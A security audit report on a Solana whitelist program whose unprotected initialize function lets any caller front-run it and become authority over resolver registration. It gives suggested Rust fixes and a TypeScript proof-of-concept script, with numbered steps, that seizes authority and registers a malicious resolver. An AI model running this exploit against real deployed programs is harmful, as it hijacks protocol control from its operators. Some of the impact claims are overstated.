# Audit Report

## Title
Unprotected Initialize Function Allows Authority Takeover Through Writable Account Abuse

## Summary
The whitelist program's `initialize` function lacks access control validation, allowing any attacker to call it first and become the whitelist authority. This enables complete control over resolver registrations, breaking the protocol's access control invariant and directly exploiting write permissions on the `whitelist_state` account to corrupt authority data.

## Finding Description
The `initialize` function in the whitelist program accepts any signer as the authority without validation. [1](#0-0) 

The function sets the authority field of the writable `whitelist_state` account to whoever calls it first. [2](#0-1) 

This creates a race condition where an attacker can front-run the legitimate authority's initialization transaction. The IDL confirms that both `authority` and `whitelist_state` accounts are marked writable in the initialize instruction. [3](#0-2) 

Once an attacker successfully initializes the whitelist, they gain complete control because:
1. All subsequent operations (`register`, `deregister`, `set_authority`) validate against the stored authority [4](#0-3) 
2. The attacker can register malicious resolvers who can then fill orders in the fusion-swap program [5](#0-4) 
3. The attacker can prevent legitimate resolvers from being registered
4. The legitimate authority has no recovery mechanism

This breaks **Invariant #5 (Access Control)** and **Invariant #7 (Account Validation)** by allowing unauthorized manipulation of the writable `whitelist_state` account's authority field.

## Impact Explanation
**HIGH Severity** - This vulnerability enables complete compromise of the resolver access control system:

- **Complete Protocol Control**: Attacker gains full authority over who can fill orders
- **Resolver Manipulation**: Attacker can register malicious resolvers and deny legitimate ones
- **Order Execution Control**: Through controlled resolvers, attacker can manipulate order fills in the fusion-swap program
- **Denial of Service**: Legitimate protocol operations are completely blocked
- **Data Corruption**: The writable `whitelist_state` account is corrupted with malicious authority data
- **Lamport Drainage**: Attacker can deregister any future resolver accounts and collect rent refunds [6](#0-5) 

The deployment script confirms a specific authority keypair is expected to initialize the program, but the on-chain code doesn't enforce this. [7](#0-6) 

## Likelihood Explanation
**HIGH Likelihood** - This vulnerability is highly likely to be exploited because:

1. **Zero Barrier to Entry**: Any attacker with basic Solana knowledge can exploit this
2. **Predictable Window**: The vulnerability window exists between program deployment and initialization
3. **Observable Transaction**: Attackers can monitor the mempool for the legitimate initialize transaction and front-run it
4. **Permanent Damage**: Once exploited, there's no recovery mechanism - the protocol is permanently compromised
5. **High Value Target**: Controlling resolver access in a DEX protocol is extremely valuable

## Recommendation
Add an authority validation check to the `initialize` function. Options include:

**Option 1: Hardcoded Authority (Most Secure)**
```rust
pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
    // Define expected authority at compile time
    const EXPECTED_AUTHORITY: Pubkey = pubkey!("AuthorityPubkeyHere");
    
    require!(
        ctx.accounts.authority.key() == EXPECTED_AUTHORITY,
        WhitelistError::Unauthorized
    );
    
    let whitelist_state = &mut ctx.accounts.whitelist_state;
    whitelist_state.authority = ctx.accounts.authority.key();
    Ok(())
}
```

**Option 2: Upgrade Authority Validation**
```rust
pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
    // Verify signer is the program upgrade authority
    let program_data = ctx.accounts.program_data.as_ref()
        .ok_or(WhitelistError::Unauthorized)?;
    
    require!(
        program_data.upgrade_authority_address == Some(ctx.accounts.authority.key()),
        WhitelistError::Unauthorized
    );
    
    let whitelist_state = &mut ctx.accounts.whitelist_state;
    whitelist_state.authority = ctx.accounts.authority.key();
    Ok(())
}
```

**Option 3: Two-Step Initialization**
Initialize with a temporary authority, then use a privileged `finalize` instruction to set the real authority.

## Proof of Concept

```rust
// Attacker's exploit script (TypeScript)
import { Connection, Keypair, Transaction, sendAndConfirmTransaction } from "@solana/web3.js";
import { Program } from "@coral-xyz/anchor";
import WHITELIST_IDL from "./whitelist.json";

async function exploit() {
    const connection = new Connection("https://api.devnet.solana.com");
    const attackerKeypair = Keypair.generate();
    const program = new Program(WHITELIST_IDL, { connection });
    
    // Attacker calls initialize before legitimate authority
    const whitelistState = findWhitelistStateAddress(program.programId);
    
    const initializeIx = await program.methods
        .initialize()
        .accountsPartial({
            authority: attackerKeypair.publicKey,
            whitelistState,
        })
        .signers([attackerKeypair])
        .instruction();
    
    const tx = new Transaction().add(initializeIx);
    await sendAndConfirmTransaction(connection, tx, [attackerKeypair]);
    
    console.log("Exploit successful! Attacker is now the whitelist authority");
    
    // Attacker can now register malicious resolvers
    const maliciousResolver = Keypair.generate();
    await program.methods
        .register(maliciousResolver.publicKey)
        .accountsPartial({
            authority: attackerKeypair.publicKey,
            whitelistState,
        })
        .signers([attackerKeypair])
        .rpc();
    
    console.log("Malicious resolver registered!");
}
```

**Exploitation Steps:**
1. Deploy whitelist program to devnet/testnet
2. Attacker monitors for deployment or knows program address
3. Before legitimate authority initializes, attacker calls `initialize` with their own keypair
4. Attacker becomes permanent authority
5. Attacker registers malicious resolvers
6. Malicious resolvers can now fill orders in fusion-swap program
7. Legitimate protocol operations are denied

## Notes

This vulnerability represents a critical failure in the access control initialization pattern. The writable `whitelist_state` account is directly abused by allowing anyone to write malicious authority data during initialization. The impact extends beyond just the whitelist program - it compromises the entire fusion-swap protocol's resolver access control mechanism, potentially enabling order manipulation and denial of service attacks.

The vulnerability is exacerbated by the fact that Anchor's `init` constraint prevents re-initialization, making the exploitation permanent and unrecoverable without deploying a new program instance.

### Citations

**File:** programs/whitelist/src/lib.rs (L18-22)
```rust
    pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
        let whitelist_state = &mut ctx.accounts.whitelist_state;
        whitelist_state.authority = ctx.accounts.authority.key();
        Ok(())
    }
```

**File:** programs/whitelist/src/lib.rs (L44-58)
```rust
pub struct Initialize<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,

    #[account(
        init,
        payer = authority,
        space = DISCRIMINATOR + WhitelistState::INIT_SPACE,
        seeds = [WHITELIST_STATE_SEED],
        bump,
    )]
    pub whitelist_state: Account<'info, WhitelistState>,

    pub system_program: Program<'info, System>,
}
```

**File:** programs/whitelist/src/lib.rs (L60-84)
```rust
#[derive(Accounts)]
#[instruction(user: Pubkey)]
pub struct Register<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,

    #[account(
      seeds = [WHITELIST_STATE_SEED],
      bump,
      // Ensures only the whitelist authority can register new users
      constraint = whitelist_state.authority == authority.key() @ WhitelistError::Unauthorized
    )]
    pub whitelist_state: Account<'info, WhitelistState>,

    #[account(
        init,
        payer = authority,
        space = DISCRIMINATOR + ResolverAccess::INIT_SPACE,
        seeds = [RESOLVER_ACCESS_SEED, user.key().as_ref()],
        bump,
    )]
    pub resolver_access: Account<'info, ResolverAccess>,

    pub system_program: Program<'info, System>,
}
```

**File:** programs/whitelist/src/lib.rs (L86-109)
```rust
#[derive(Accounts)]
#[instruction(user: Pubkey)]
pub struct Deregister<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,

    #[account(
      seeds = [WHITELIST_STATE_SEED],
      bump,
      // Ensures only the whitelist authority can deregister users from the whitelist
      constraint = whitelist_state.authority == authority.key() @ WhitelistError::Unauthorized
    )]
    pub whitelist_state: Account<'info, WhitelistState>,

    #[account(
        mut,
        close = authority,
        seeds = [RESOLVER_ACCESS_SEED, user.key().as_ref()],
        bump,
    )]
    pub resolver_access: Account<'info, ResolverAccess>,

    pub system_program: Program<'info, System>,
}
```

**File:** idl/whitelist.json (L121-158)
```json
        {
          "name": "authority",
          "writable": true,
          "signer": true
        },
        {
          "name": "whitelist_state",
          "writable": true,
          "pda": {
            "seeds": [
              {
                "kind": "const",
                "value": [
                  119,
                  104,
                  105,
                  116,
                  101,
                  108,
                  105,
                  115,
                  116,
                  95,
                  115,
                  116,
                  97,
                  116,
                  101
                ]
              }
            ]
          }
        },
        {
          "name": "system_program",
          "address": "11111111111111111111111111111111"
        }
      ],
```

**File:** programs/fusion-swap/src/lib.rs (L511-516)
```rust
    #[account(
        seeds = [whitelist::RESOLVER_ACCESS_SEED, taker.key().as_ref()],
        bump = resolver_access.bump,
        seeds::program = whitelist::ID,
    )]
    resolver_access: Account<'info, whitelist::ResolverAccess>,
```

**File:** scripts/whitelsit/initialize.ts (L20-42)
```typescript
async function initialize(
  connection: Connection,
  program: Program<Whitelist>,
  authorityKeypair: Keypair
): Promise<void> {
  const whitelistState = findWhitelistStateAddress(program.programId);

  const initializeIx = await program.methods
    .initialize()
    .accountsPartial({
      authority: authorityKeypair.publicKey,
      whitelistState,
    })
    .signers([authorityKeypair])
    .instruction();

  const tx = new Transaction().add(initializeIx);

  const signature = await sendAndConfirmTransaction(connection, tx, [
    authorityKeypair,
  ]);
  console.log(`Transaction signature ${signature}`);
}
```
